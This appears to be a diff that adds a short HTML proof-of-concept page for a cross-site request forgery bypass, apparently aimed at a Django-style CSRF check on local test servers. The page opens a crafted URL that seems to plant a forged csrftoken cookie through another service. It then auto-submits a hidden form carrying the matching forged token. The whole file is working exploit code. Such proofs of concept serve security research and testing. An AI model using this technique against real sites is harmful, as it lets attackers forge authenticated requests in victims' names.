@@ -1,0 +1,21 @@
+<form id="csrf" action="http://127.0.0.1:8002/check/" method="POST">
+    <input type="hidden" name="csrfmiddlewaretoken" value="boom">
+</form>
+
+<script type="text/javascript" charset="utf-8">
+    function sleep(time){
+        return new Promise((resolve)=>setTimeout(resolve, time));
+    }
+
+    function poc(){
+        window.open('http://127.0.0.1:8004/hello]csrftoken=boom');
+
+        sleep(5000).then(()=>{
+            document.getElementById('csrf').submit();        
+        })
+    }
+</script>
+
+<a href='#' onclick=poc()> Click me </a>
+
+
